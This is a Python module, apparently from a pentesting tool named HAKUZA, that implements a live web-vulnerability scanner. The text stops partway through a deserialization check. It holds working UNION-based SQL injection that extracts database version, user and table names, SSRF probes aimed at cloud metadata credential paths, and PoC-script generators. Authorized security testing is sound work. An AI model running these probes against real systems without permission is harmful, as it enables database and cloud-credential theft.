"""
mod_active.py — HAKUZA Live Active Testing Engine (`hakuza active`)

What this is and why it exists
-------------------------------
Every other scanning path in HAKUZA (`hakuza scan`, nuclei templates) is
STATIC template matching: a known request/response signature is compared
against a fixed list of known bad patterns. That is fast and cheap, but it
only ever finds what someone already wrote a template for.

This module is the opposite approach — an ACTIVE, adaptive differential
testing engine:

  1. Establish a real statistical baseline for a target URL (3 live requests:
     status code, body length, sha256 of the body, and response timing —
     mean + population stdev).
  2. Mutate one query parameter at a time with a small, carefully-scoped set
     of non-destructive probes (reflection canaries, SQL error/boolean/
     time-based signals, SSTI, path traversal, open redirect, CRLF/header
     injection), sending each live and diffing the real response against the
     real baseline (status/length/hash/similarity-ratio/timing).
  3. For ambiguous signals (a differential pattern that's suggestive but not
     a slam-dunk), optionally escalate to Claude for a human-pentester-style
     judgment call via mod_active_ai.py's ai_confirm_finding().
  4. For every CONFIRMED result, persist a real finding AND auto-generate a
     standalone, reproducible curl command + Python PoC script so the report
     (and an interviewer) can independently re-run the exact request that
     proved the bug — not just trust a scanner's say-so.

This is what "better than a template-based scanner" means in practice: it
reasons about THIS target's actual live behaviour instead of pattern-
matching against a static library of known signatures.

Drop into the same directory as hakuza.py. The bottom of this file shows the
argparse addition and dispatch table entry needed in hakuza.py's
build_parser() and main() functions (mirrors mod_recon_plus.py's pattern).

--script contract
------------------
`hakuza active --script PATH` runs an existing local Python file via
mod_active_ai.run_custom_script() (no AI drafting). If the script's stdout
contains a line of the exact form:

    HAKUZA_FINDING: {"title": "...", "severity": "...", "description": "..."}

it is parsed and — after an explicit y/n prompt — persisted as a real
finding via add_finding(). This is how a user's own custom test scripts (or
ones written live in an interview) plug into HAKUZA's finding pipeline
without HAKUZA needing to understand what the script actually does.

--ai-script contract
----------------------
`hakuza active --ai-script "description"` asks Claude (via
mod_active_ai.draft_ai_test_script()) to draft a standalone Python test
script for the given description against the current target. The FULL
script is always printed for review, and it is NEVER executed without an
explicit "Execute this AI-drafted script now?" confirmation — no exceptions.
If confirmed, the script is saved as a reviewable artifact under the
engagement's artifacts/ directory first, then executed, and the same
HAKUZA_FINDING: persistence flow as --script is offered.
"""

# ---------------------------------------------------------------------------
# stdlib + optional deps
# ---------------------------------------------------------------------------
import re
import os
import json
import time
import math
import difflib
import hashlib
import secrets
import warnings
import statistics
import concurrent.futures
import base64
import hmac
import socket
import pickle
from datetime import datetime
from pathlib import Path
from urllib.parse import urlsplit, urlunsplit, parse_qsl, quote

from rich.markup import escape as _rich_escape

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ---------------------------------------------------------------------------
# HAKUZA core imports — lazy, call-time resolution (see mod_recon_plus.py for
# the same pattern). Keeps this file importable standalone without a
# circular import against hakuza.py.
# ---------------------------------------------------------------------------


def _hakuza():
    """Lazy import of the hakuza module so this file is importable standalone."""
    import importlib
    return importlib.import_module("hakuza")


def _n(attr):
    """Fetch an attribute from the hakuza module at call-time."""
    return getattr(_hakuza(), attr)


def _require_engagement(console):
    return _n("_require_engagement")(console)


def _get_client_or_none():
    return _n("get_client_or_none")()


def _add_finding(eng_id, **kwargs):
    return _n("add_finding")(eng_id, **kwargs)


def _add_recon(eng_id, data_type, content, source=None):
    return _n("add_recon_data")(eng_id, data_type, content, source)


def _add_artifact(eng_id, **kwargs):
    return _n("add_artifact")(eng_id, **kwargs)


def _get_latest_recon(eng_id, data_type, limit=5):
    return _n("get_latest_recon")(eng_id, data_type, limit)


def _get_recon_summary(eng_id):
    return _n("get_recon_summary")(eng_id)


def _mod_recon_plus():
    """The already-imported mod_recon_plus module object from hakuza.py's
    namespace, or None if it failed to import there. Used only for its scope
    helpers (_load_scope / _url_in_scope) — never re-imported directly, to
    stay consistent with the rest of the codebase's single-import-site
    convention for optional modules."""
    return _n("mod_recon_plus")


def _rich():
    from rich.panel import Panel
    from rich.rule import Rule
    from rich.table import Table
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich import box
    return Panel, Rule, Table, Prompt, Confirm, Syntax, box


# ---------------------------------------------------------------------------
# Optional mod_active_ai.py integration — fixed contract, built in parallel.
# Do NOT wait for it, do NOT create it here. If missing, the core diffing
# engine still runs fully; AI escalation and PoC generation are skipped with
# a one-line notice (same "degrade gracefully" philosophy as HAS_REQUESTS
# elsewhere in this codebase).
# ---------------------------------------------------------------------------
try:
    from mod_active_ai import (
        ai_confirm_finding,      # (client, vuln_class, param, url, payload, baseline_evidence, mutated_evidence) -> dict
        gen_curl_poc,             # (method, url, params, headers=None) -> str
        gen_python_poc,           # (method, url, params, vuln_class, param, payload, expected_signal) -> str
        run_custom_script,        # (script_path, timeout=30) -> dict
        draft_ai_test_script,     # (client, description, target_url, engagement_context) -> str
    )
    HAS_ACTIVE_AI = True
except ImportError:
    HAS_ACTIVE_AI = False


# ---------------------------------------------------------------------------
# Optional Playwright integration — real headless-browser JavaScript
# execution, used ONLY by the DOM-based XSS check below. Every other check
# in this file works by inspecting raw HTTP response TEXT, which structurally
# cannot detect DOM XSS (the vulnerable code path never touches the server
# response at all — e.g. `document.write(location.hash)`). Same graceful-
# degradation philosophy as HAS_REQUESTS/HAS_ACTIVE_AI above: if Playwright
# isn't installed, the core diffing engine and every other check still run
# fully, and the DOM-XSS check just prints a one-line skip notice instead of
# failing the whole run.
# ---------------------------------------------------------------------------
try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False


_UA_HEADERS = {"User-Agent": "Mozilla/5.0 (HAKUZA-Active/2.0; +differential-testing)"}

# ---------------------------------------------------------------------------
# SQL error-vendor signatures (error-based SQLi, step 2)
# ---------------------------------------------------------------------------
_SQLI_ERROR_SIGNATURES = [
    (r"you have an error in your sql syntax", "mysql"),
    (r"warning: mysql_", "mysql"),
    (r"unclosed quotation mark after the character string", "mssql"),
    (r"microsoft ole db provider for sql server", "mssql"),
    (r"quoted string not properly terminated", "oracle"),
    (r"ora-\d{5}", "oracle"),
    (r"postgresql.*error|pg_query\(\)|syntax error at or near", "postgresql"),
    (r"sqlite3?\.(operationalerror|error)|unrecognized token", "sqlite"),
    (r"sqlstate\[\d+\]", None),  # generic PDO — vendor unknown, extraction not attempted
]

# ---------------------------------------------------------------------------
# UNION-based extraction — only attempted after error-based confirmation
# tells us the exact vendor (boolean-blind alone isn't enough to safely guess
# syntax). Turns "this parameter is injectable" into "here is the actual
# extracted DB version / user / table names", which is the difference
# between a scanner's say-so and a report a client can't argue with. Every
# extraction query is a read-only SELECT — no vendor entry here ever writes.
# MSSQL's table-enumeration story (no portable LIMIT/OFFSET across all
# supported versions) is intentionally left unimplemented rather than
# faked — version/db/user still extract fine for MSSQL.
# ---------------------------------------------------------------------------
_SQLI_VENDOR_SYNTAX = {
    "mysql": {
        "comment": "-- -",
        "concat": lambda expr: f"CONCAT('HKZS',{expr},'HKZE')",
        "version": "@@version", "current_db": "database()", "current_user": "current_user()",
        "tables_query": lambda off: (
            "SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema=database() LIMIT 1 OFFSET {off}"
        ),
    },
    "postgresql": {
        "comment": "-- -",
        "concat": lambda expr: f"'HKZS'||{expr}||'HKZE'",
        "version": "version()", "current_db": "current_database()", "current_user": "current_user",
        "tables_query": lambda off: (
            "SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema='public' LIMIT 1 OFFSET {off}"
        ),
    },
    "sqlite": {
        "comment": "-- -",
        "concat": lambda expr: f"'HKZS'||{expr}||'HKZE'",
        "version": "sqlite_version()", "current_db": "'main'", "current_user": "'n/a'",
        "tables_query": lambda off: (
            "SELECT name FROM sqlite_master WHERE type='table' "
            f"LIMIT 1 OFFSET {off}"
        ),
    },
    "mssql": {
        "comment": "-- -",
        "concat": lambda expr: f"'HKZS'+{expr}+'HKZE'",
        "version": "@@version", "current_db": "DB_NAME()", "current_user": "SYSTEM_USER",
        "tables_query": None,  # not implemented — no portable LIMIT/OFFSET across supported versions
    },
}

# ---------------------------------------------------------------------------
# NOTE on payload choices throughout this module: every payload below is
# intentionally NON-DESTRUCTIVE (no DROP/DELETE/UPDATE/INSERT, no `rm -rf`,
# no actual file-write attempts). This tool is meant to run against real
# targets (including a candidate employer's or bug-bounty program's live
# infrastructure) — being reckless there is a liability, not a feature, for
# a portfolio/interview tool. All time-based payloads use a bounded 4-second
# sleep, not something that could pile up long-running queries on a busy
# target.
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Request budget + polite HTTP helpers
# ---------------------------------------------------------------------------

class _RequestBudget:
    def __init__(self, max_requests):
        self.max_requests = max_requests
        self.count = 0

    def exhausted(self):
        return self.count >= self.max_requests

    def spend(self, n=1):
        self.count += n


class _ActiveCtx:
    """Small bag of shared state passed to every per-param test helper."""
    def __init__(self, console, eng, eng_id, client, ai_enabled, gen_poc,
                 depth, timeout, delay, budget):
        self.console = console
        self.eng = eng
        self.eng_id = eng_id
        self.client = client
        self.ai_enabled = ai_enabled
        self.gen_poc = gen_poc
        self.depth = depth
        self.timeout = timeout
        self.delay = delay
        self.budget = budget
        self.findings = []


def _polite_get(budget, delay, url, timeout, allow_redirects=True):
    """Budget-aware, rate-limited GET. Returns the Response, or None on
    exhausted budget / connection failure (never raises)."""
    if budget.exhausted():
        return None
    time.sleep(delay)
    budget.spend()
    try:
        return requests.get(url, timeout=timeout, allow_redirects=allow_redirects,
                            headers=_UA_HEADERS)
    except Exception:
        return None


def _ctx_snippet(text, needle, window=150, maxlen=1200):
    """Return a short context window around `needle` in `text` (or the head
    of `text` if the needle isn't found / is empty) — used to keep evidence
    and AI-escalation payloads bounded in size."""
    text = text or ""
    if needle:
        idx = text.find(needle)
        if idx != -1:
            start = max(0, idx - window)
            end = min(len(text), idx + len(needle) + window)
            return text[start:end][:maxlen]
    return text[:maxlen]


# ---------------------------------------------------------------------------
# URL / query-param mutation helpers
# ---------------------------------------------------------------------------

def _with_param(pairs, name, value):
    """Return a new list of (k, v) query pairs with `name`'s value replaced."""
    return [(k, value if k == name else v) for k, v in pairs]


def _build_url(parts, pairs, raw_names=None):
    """Rebuild a full URL from urlsplit() parts + decoded (k, v) query pairs.
    Every value is re-percent-encoded UNLESS its key is in `raw_names`, in
    which case it is inserted verbatim — this is required for payloads that
    already contain deliberate percent-escapes (e.g. the CRLF injection
    payload `%0d%0a...`), so they are not double-encoded into `%250d%250a`
    (which would silently defeat the test)."""
    raw_names = raw_names or set()
    segs = []
    for k, v in pairs:
        if k in raw_names:
            segs.append(f"{quote(k, safe='')}={v}")
        else:
            segs.append(f"{quote(k, safe='')}={quote(str(v), safe='')}")
    query = "&".join(segs)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))


# ---------------------------------------------------------------------------
# Baseline capture
# ---------------------------------------------------------------------------

def _capture_baseline(url, timeout, budget, delay):
    """Send the SAME real GET 3 times. Returns a baseline dict, or None if
    any of the 3 requests fails (connection error) or the budget runs out
    mid-capture — caller skips this target with a clear message rather than
    crashing the whole run over one dead target."""
    statuses, lengths, hashes, times = [], [], [], []
    body0, headers0 = "", {}
    for i in range(3):
        if budget.exhausted():
            return None
        time.sleep(delay)
        budget.spend()
        try:
            t0 = time.monotonic()
            r = requests.get(url, timeout=timeout, allow_redirects=True, headers=_UA_HEADERS)
            elapsed = time.monotonic() - t0
        except Exception:
            return None
        body = r.text or ""
        statuses.append(r.status_code)
        lengths.append(len(body))
        hashes.append(hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest())
        times.append(elapsed)
        if i == 0:
            body0, headers0 = body, dict(r.headers)
    return {
        "status": statuses[0], "status_codes": statuses,
        "length": lengths[0], "lengths": lengths,
        "hashes": hashes, "times": times,
        "mean_time": statistics.mean(times),
        "stdev_time": statistics.pstdev(times),
        "body": body0, "headers": headers0,
    }


# ---------------------------------------------------------------------------
# AI escalation
# ---------------------------------------------------------------------------

def _ai_escalate(ctx, vuln_class, param, url, payload, baseline_body, mutated_body):
    """Call mod_active_ai.ai_confirm_finding, truncating snippets first to
    keep token cost down. Returns a verdict dict, or None if AI escalation
    isn't enabled for this run. ai_confirm_finding itself never raises per
    its contract, but we defensively catch anyway."""
    if not ctx.ai_enabled:
        return None
    try:
        return ai_confirm_finding(
            ctx.client, vuln_class, param, url, payload,
            _ctx_snippet(baseline_body, "", maxlen=1200),
            _ctx_snippet(mutated_body, "", maxlen=1200),
        )
    except Exception as e:
        return {"verdict": "UNLIKELY", "reasoning": f"AI escalation call raised an exception: {e}",
                "next_payload": None}


# ---------------------------------------------------------------------------
# Finding persistence + PoC generation
# ---------------------------------------------------------------------------

def _persist(ctx, *, title, severity, category, url, param, payload, description,
             baseline_snippet, mutated_snippet, impact, remediation, ai_reasoning=None,
             extra_evidence=None, custom_poc_script=None, poc_verify=True):
    console = ctx.console

    evidence_parts = [
        f"Parameter: {param}",
        f"Payload: {payload}",
        "",
        "--- Baseline (context) ---",
        baseline_snippet,
        "",
        "--- Mutated response (context) ---",
        mutated_snippet,
    ]
    if extra_evidence:
        evidence_parts += ["", "--- Extracted data (UNION-based) ---", extra_evidence]
    if ai_reasoning:
        evidence_parts += ["", "--- AI escalation reasoning ---", ai_reasoning]

    curl_cmd = None
    if ctx.gen_poc:
        try:
            curl_cmd = gen_curl_poc("GET", url, {}, headers=None)
        except Exception as e:
            console.print(f"  [dim]curl PoC generation failed: {_rich_escape(str(e))}[/dim]")
    if curl_cmd:
        evidence_parts += ["", "--- curl PoC ---", curl_cmd]

    evidence_text = "\n".join(str(x) for x in evidence_parts)[:6000]

    full_description = (
        description.rstrip() +
        "\n\nThis finding was ACTIVELY VERIFIED via live differential response testing "
        "(a real statistical baseline was captured for this exact target with 3 repeated "
        "requests, the request was mutated, and the live mutated response was diffed "
        "against that baseline) — it is not a static template/signature match."
    )

    finding = _add_finding(
        ctx.eng_id,
        title=title,
        severity=severity,
        category=category,
        url=url,
        description=full_description,
        evidence=evidence_text,
        impact=impact,
        remediation=remediation,
        tool="hakuza-active",
    )
    ctx.findings.append(finding)

    sev_color = {"critical": "red", "high": "red", "medium": "yellow",
                 "low": "green", "informational": "blue"}.get(severity, "white")
    console.print(f"  [bold {sev_color}]CONFIRMED[/bold {sev_color}] "
                 f"[{finding['short_id']}] {_rich_escape(title)}")

    if ctx.gen_poc:
        script_src = custom_poc_script or ""
        if not script_src:
            try:
                script_src = gen_python_poc("GET", url, {}, category, param, payload,
                                            expected_signal=mutated_snippet[:200],
                                            verify=poc_verify)
            except Exception as e:
                console.print(f"  [dim]Python PoC generation failed: {_rich_escape(str(e))}[/dim]")
        if script_src:
            try:
                artifacts_dir = _n("ENGAGEMENTS_DIR") / ctx.eng["name"] / "artifacts"
                artifacts_dir.mkdir(parents=True, exist_ok=True)
                poc_path = artifacts_dir / f"poc_{finding['short_id']}.py"
                poc_path.write_text(script_src, encoding="utf-8")
                _add_artifact(ctx.eng_id, artifact_type="poc-script", filename=poc_path.name,
                              filepath=str(poc_path), tool="hakuza-active")
                console.print(f"  [dim]PoC script:[/dim] {poc_path}")
            except Exception as e:
                console.print(f"  [yellow]Could not write PoC script: {_rich_escape(str(e))}[/yellow]")

    return finding


# ---------------------------------------------------------------------------
# UNION-based SQLi extraction — turns "confirmed injectable" into "here is
# the actual extracted data". Only called after error-based confirmation has
# already told us the exact vendor (see _SQLI_VENDOR_SYNTAX above). Every
# request here is a read-only SELECT via UNION; nothing here ever writes.
# ---------------------------------------------------------------------------

_HKZ_MARK_RE = re.compile(r"HKZS(.*?)HKZE", re.S)
# If the target ALSO reflects the raw request parameter elsewhere on the
# page (common — reflected XSS and SQLi often coexist on the same
# parameter, exactly like this project's own testlab/vulnerable_site.py),
# the marker text appears TWICE: once verbatim as part of the unevaluated
# injected SQL string, and once as the genuinely evaluated UNION result.
# Every vendor's concat wrapping in _SQLI_VENDOR_SYNTAX ('HKZS'||expr||
# 'HKZE', CONCAT('HKZS',expr,'HKZE'), 'HKZS'+expr+'HKZE') puts the literal
# marker text directly adjacent to a single-quote string-literal boundary
# on BOTH sides — so the raw, unevaluated occurrence's captured span always
# starts AND ends with a literal quote character. A genuinely evaluated
# value (a version string, a table name, a username) essentially never
# does. This mirrors _marker_evaluated's "quote-bounded on both sides"
# adjacency check below, rather than rejecting on ANY punctuation
# occurring anywhere inside the value — the earlier, blunter version of
# this filter (any '|()+ character anywhere in the candidate) rejected
# genuinely-extracted data that legitimately contains those characters,
# e.g. MSSQL's @@version reading like "... (RTM-CU18) ... (X64) ...", an
# extracted username like "O'Brien", or a value containing a phone number.
def _find_union_marker(text):
    for m in _HKZ_MARK_RE.finditer(text or ""):
        candidate = m.group(1).strip()
        if candidate and not (candidate.startswith("'") and candidate.endswith("'")):
            return candidate
    return None


def _sqli_column_count(ctx, parts, pairs, pname, orig_value, comment, max_cols=10):
    """ORDER BY N, incrementing until the response errors/changes relative
    to a plain baseline of the same request with no ORDER BY at all. The
    first N that breaks the query means the true column count is N-1.
    Returns None if it can't be determined within max_cols (bounded cost —
    extraction is skipped rather than guessing further)."""
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout

    ref_url = _build_url(parts, _with_param(pairs, pname, f"{orig_value}' {comment}"))
    ref = _polite_get(budget, delay, ref_url, timeout)
    if ref is None:
        return None
    ref_body = ref.text or ""
    ref_len = len(ref_body)

    for n in range(1, max_cols + 1):
        if budget.exhausted():
            return None
        payload = f"{orig_value}' ORDER BY {n} {comment}"
        url = _build_url(parts, _with_param(pairs, pname, payload))
        resp = _polite_get(budget, delay, url, timeout)
        if resp is None:
            return None
        body = resp.text or ""
        # Same generic status/length differencing the error-based step
        # already relies on — a bare regex match is not enough here, since
        # the exact "ORDER BY out of range" wording varies by vendor/driver
        # far more than a generic syntax-error message does (SQLite's, for
        # example, is "does not match any column in the result set", which
        # doesn't hit any of the vendor fingerprints above).
        status_changed = resp.status_code != ref.status_code
        len_changed = abs(len(body) - ref_len) > max(40, ref_len * 0.05)
        sig_hit = any(re.search(pat, body, re.I) and not re.search(pat, ref_body, re.I)
                     for pat, _v in _SQLI_ERROR_SIGNATURES)
        if resp.status_code >= 500 or sig_hit or status_changed or len_changed:
            return (n - 1) if n > 1 else None
    return None  # more than max_cols columns — bail rather than keep guessing


def _marker_evaluated(body, marker):
    """True if `marker` appears in `body` somewhere NOT immediately
    quote-bounded on both sides — i.e., not just the raw, unevaluated
    'marker' SQL literal being reflected verbatim elsewhere on the page
    (see _find_union_marker's docstring above for the full reasoning: a
    genuinely evaluated string column renders as plain text, the syntax
    quotes are consumed by SQL evaluation, not passed through to output)."""
    for m in re.finditer(re.escape(marker), body):
        before = body[m.start() - 1] if m.start() > 0 else ""
        after = body[m.end()] if m.end() < len(body) else ""
        if not (before == "'" and after == "'"):
            return True
    return False


def _sqli_visible_column(ctx, parts, pairs, pname, orig_value, comment, col_count):
    """Find a column position that reflects a string value into the visible
    response. Tries an all-marker UNION first (1 request, works on
    dynamically-typed backends like SQLite and permissive setups); falls
    back to an all-NULL UNION with a linear per-column swap (bounded by
    col_count, already capped at 10) for strict-typed backends that reject
    a string in a numeric-typed column position."""
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout

    def _try(cols):
        payload = f"{orig_value}' UNION SELECT {','.join(cols)} {comment}"
        url = _build_url(parts, _with_param(pairs, pname, payload))
        resp = _polite_get(budget, delay, url, timeout)
        if resp is None:
            return None
        return resp.text or ""

    marker_cols = [f"'HKZUC{i}'" for i in range(col_count)]
    body = _try(marker_cols)
    if body:
        for i in range(col_count):
            if _marker_evaluated(body, f"HKZUC{i}"):
                return i

    if budget.exhausted():
        return None
    null_cols = ["NULL"] * col_count
    if _try(null_cols) is None:
        return None  # UNION with all-NULL still fails — not exploitable this way

    for i in range(col_count):
        if budget.exhausted():
            return None
        trial = list(null_cols)
        trial[i] = f"'HKZUC{i}'"
        body = _try(trial)
        if body and _marker_evaluated(body, f"HKZUC{i}"):
            return i
    return None


def _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment, col_count, vis_idx,
                        expr, concat_fn):
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
    if budget.exhausted():
        return None
    cols = ["NULL"] * col_count
    cols[vis_idx] = concat_fn(expr)
    payload = f"{orig_value}' UNION SELECT {','.join(cols)} {comment}"
    url = _build_url(parts, _with_param(pairs, pname, payload))
    resp = _polite_get(budget, delay, url, timeout)
    if resp is None:
        return None
    return _find_union_marker(resp.text or "")


def _attempt_sqli_extraction(ctx, parts, pairs, pname, orig_value, vendor):
    """Best-effort UNION-based extraction. Returns a human-readable evidence
    string on success, or None on any failure/inconclusive step — extraction
    is a bonus on top of an already-confirmed finding, so it fails quietly
    rather than ever blocking or degrading the base finding."""
    syntax = _SQLI_VENDOR_SYNTAX.get(vendor)
    if not syntax:
        return None

    comment = syntax["comment"]
    concat_fn = syntax["concat"]
    col_count = _sqli_column_count(ctx, parts, pairs, pname, orig_value, comment)
    if not col_count or ctx.budget.exhausted():
        return None

    vis_idx = _sqli_visible_column(ctx, parts, pairs, pname, orig_value, comment, col_count)
    if vis_idx is None or ctx.budget.exhausted():
        return None

    lines = [f"Vendor: {vendor}  |  Columns: {col_count}  |  Visible column index: {vis_idx}"]

    version = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
                                   col_count, vis_idx, syntax["version"], concat_fn)
    if version:
        lines.append(f"Version: {version}")

    if not ctx.budget.exhausted():
        current_db = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
                                         col_count, vis_idx, syntax["current_db"], concat_fn)
        if current_db:
            lines.append(f"Current database: {current_db}")

    if not ctx.budget.exhausted():
        current_user = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
                                           col_count, vis_idx, syntax["current_user"], concat_fn)
        if current_user:
            lines.append(f"Current DB user: {current_user}")

    tables_fn = syntax.get("tables_query")
    if tables_fn:
        tables = []
        for offset in range(5):
            if ctx.budget.exhausted():
                break
            t = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
                                    col_count, vis_idx, f"({tables_fn(offset)})", concat_fn)
            if not t:
                break
            tables.append(t)
        if tables:
            lines.append(f"Tables (first {len(tables)}): {', '.join(tables)}")
    else:
        lines.append("Table enumeration: not attempted (no portable syntax for this vendor in v1)")

    if len(lines) <= 1:
        return None  # nothing beyond the header extracted — don't claim a hollow win
    ctx.console.print(f"  [dim]UNION extraction ({vendor}): {len(lines)-1} value(s) pulled[/dim]")
    return "\n".join(lines)


def _gen_header_poc(url, category, extra_headers, allow_redirects, header_name, check_mode, expected_value):
    """CORS, CRLF, and Open Redirect findings live in RESPONSE HEADERS (and
    CORS specifically requires SENDING an extra request header) — the
    generic gen_python_poc() only ever inspects the response BODY with no
    way to send extra headers or disable redirect-following, so it can
    never reproduce any of these three regardless of whether the
    underlying bug is still present. One small dedicated generator, shared
    by all three via check_mode."""
    check_code = {
        "equals": f"headers_out.get({header_name!r}, '') == {expected_value!r}",
        "startswith": f"headers_out.get({header_name!r}, '').startswith({expected_value!r})",
        "present": f"{header_name!r} in headers_out",
    }[check_mode]
    return f'''#!/usr/bin/env python3
# PoC: {category!r} reproduction
# Target: {url!r}
# Generated by hakuza active — HAKUZA active-testing engine.
# Run: pip install requests && python3 <this file>

import sys
import requests

URL = {url!r}
EXTRA_HEADERS = {extra_headers!r}
ALLOW_REDIRECTS = {allow_redirects!r}


def main() -> int:
    try:
        resp = requests.get(URL, headers=EXTRA_HEADERS, allow_redirects=ALLOW_REDIRECTS, timeout=15)
    except requests.RequestException as exc:
        print(f"[FAIL] Request failed: {{exc}}")
        return 1

    headers_out = resp.headers
    print(f"Status: {{resp.status_code}}")
    print(f"Response headers: {{dict(headers_out)}}")

    if {check_code}:
        print("[PASS] Vulnerability reproduced")
        return 0

    print("[FAIL] Signal not found -- target may be patched or behavior changed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
'''


def _gen_timing_poc(url, category, threshold):
    """Time-based blind SQLi/command-injection findings prove themselves
    via ELAPSED REQUEST TIME, not response body content — the real check's
    mutated_snippet is a synthetic "mutated request elapsed: Xs" string
    that never appears verbatim in any live response body, so the generic
    PoC's substring-in-body check can never pass regardless of whether the
    target is still vulnerable. This times a real request against the same
    threshold the live detector used."""
    return f'''#!/usr/bin/env python3
# PoC: {category!r} reproduction (time-based blind)
# Target: {url!r}
# Generated by hakuza active — HAKUZA active-testing engine.
# Run: pip install requests && python3 <this file>

import sys
import time
import requests

URL = {url!r}
THRESHOLD = {threshold!r}


def main() -> int:
    t0 = time.monotonic()
    try:
        requests.get(URL, timeout=max(THRESHOLD + 5, 15))
    except requests.exceptions.Timeout:
        print("[FAIL] Request timed out before completing -- inconclusive")
        return 1
    except requests.RequestException as exc:
        print(f"[FAIL] Request failed: {{exc}}")
        return 1
    elapsed = time.monotonic() - t0

    print(f"Elapsed: {{elapsed:.2f}}s (threshold: {{THRESHOLD:.2f}}s)")
    if elapsed >= THRESHOLD:
        print("[PASS] Vulnerability reproduced -- response delayed past threshold")
        return 0

    print("[FAIL] Response returned before threshold -- target may be patched")
    return 1


if __name__ == "__main__":
    sys.exit(main())
'''


def _gen_graphql_poc(url, category):
    """The real check's mutated_snippet is an f'Leaked types: {{sample}}'
    string — "Leaked types: " is a label this code invented for the
    finding evidence, never real server output, so the generic PoC's
    substring-in-body check can never pass. This reproduces the actual
    check: parse the response as JSON and look for a genuine
    __schema.types leak, exactly like the live detector does."""
    return f'''#!/usr/bin/env python3
# PoC: {category!r} reproduction
# Target: {url!r}
# Generated by hakuza active — HAKUZA active-testing engine.
# Run: pip install requests && python3 <this file>

import sys
import json
import requests

URL = {url!r}


def main() -> int:
    try:
        resp = requests.get(URL, timeout=15)
    except requests.RequestException as exc:
        print(f"[FAIL] Request failed: {{exc}}")
        return 1

    body = resp.text or ""
    print(f"Status: {{resp.status_code}}")

    type_names = []
    try:
        data = json.loads(body)
        schema = (data.get("data") or {{}}).get("__schema") if isinstance(data, dict) else None
        if isinstance(schema, dict) and isinstance(schema.get("types"), list):
            type_names = [t.get("name") for t in schema["types"] if isinstance(t, dict) and t.get("name")]
    except Exception:
        pass

    schema_leaked = len(type_names) >= 3 or (
        '"__schema"' in body and '"types"' in body and body.count('"name"') >= 5
    )

    if schema_leaked:
        print(f"Leaked {{len(type_names)}} type name(s): {{', '.join(type_names[:12])}}")
        print("[PASS] Vulnerability reproduced")
        return 0

    print("[FAIL] Signal not found -- target may be patched or behavior changed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
'''


# Parameter names that suggest the SERVER ITSELF fetches a URL built from
# this value — image proxies, "load remote document" features, webhook
# validators, avatar-by-URL uploads, PDF-from-URL generators. Deliberately
# broad: matching only means "worth testing," not "vulnerable" — both SSRF
# signals below only ever fire on a genuine, zero-ambiguity content match,
# so a broad gate here only costs request budget, never a false positive.
_SSRF_PARAM_RE = re.compile(
    r"url|uri|link|src|image|img|avatar|photo|webhook|callback|feed|proxy|"
    r"fetch|endpoint|target|host|site|resource|remote",
    re.I,
)
# Well-known cloud instance-metadata addresses. 169.254.169.254 (AWS and
# most other clouds' link-local IMDS address) and GCP's
# metadata.google.internal are the two with a stable, unauthenticated-by-
# default GET response shape worth probing directly; Azure's metadata
# service requires a Metadata:true request HEADER we don't control (the
# TARGET's own fetch client would need to send it, not us), so it isn't
# included here — a false negative on Azure specifically, not a gap in
# the technique.
_SSRF_METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
]
# Real AWS/GCP instance-metadata content signatures — matched against the
# LIVE response body, not just "the request didn't error." A target whose
# URL-fetch feature returns a generic failure page for any unreachable
# host would never satisfy this, by design.
_SSRF_METADATA_LEAK_RE = re.compile(
    r"ami-id|instance-id|iam/security-credentials|security-credentials/|"
    r"local-ipv4|public-ipv4|computeMetadata|instance/service-accounts|"
    r"placement/availability-zone",
    re.I,
)
# A parameter's ORIGINAL (baseline) value starting with an XML declaration
# or an opening tag — real evidence this exact parameter already carries
# XML content through to the server's own parser, rather than guessing
# XML onto an arbitrary string/numeric parameter that was never going to
# accept it.
_XML_SHAPED_RE = re.compile(r"^\s*(<\?xml|<[a-zA-Z])")


def _redirect_target_host(location):
    """Extract the effective target host from a Location header value the
    way a real HTTP client/browser would resolve it — not just plain
    urlsplit() netloc parsing, which misses a leading-backslash payload
    entirely (backslash isn't a URL-syntax separator per RFC 3986, but
    several real browsers historically normalize it to a forward slash
    before parsing). Also strips userinfo (anything before the last '@')
    so a payload like 'https://realhost.tld@evil.tld/x' — which some
    naive redirect filters accept because the STRING literally starts
    with the trusted host — correctly resolves to the actual attacker
    host, evil.tld, not realhost.tld. Returns None if the value doesn't
    parse to a real authority at all (a plain relative path, or the
    canary string merely appearing as a query-string VALUE rather than
    the actual redirect target — both correctly not a match)."""
    if not location:
        return None
    netloc = urlsplit(location.replace("\\", "/")).netloc
    if not netloc:
        return None
    return netloc.rsplit("@", 1)[-1].split(":")[0].lower()


def _pickle_b64_variant(value):
    """If `value` decodes (as standard or urlsafe base64) to bytes matching
    Python pickle's protocol-2+ magic header (0x80 followed by a protocol
    byte 2-5 — every Python 3 default), return which base64 alphabet it
    used ('standard' or 'urlsafe') so a forged payload can be encoded the
    same way the target's own value already was. Returns None otherwise —
    the entire gate for the deserialization check below, mirroring the
    same "test only what the target already demonstrated it accepts"
    philosophy the XML-shape check uses for XXE. Verified directly before
    relying on it: a real pickle payload's base64 form matches, an
    unrelated base64-shaped string (a JWT fragment) and plain text do not
    — the magic-byte pair alone is specific enough (1-in-65536 by chance,
    before even requiring valid base64 padding/alphabet) that this isn't
    a guess."""
    if not value or len(value) < 4:
        return None
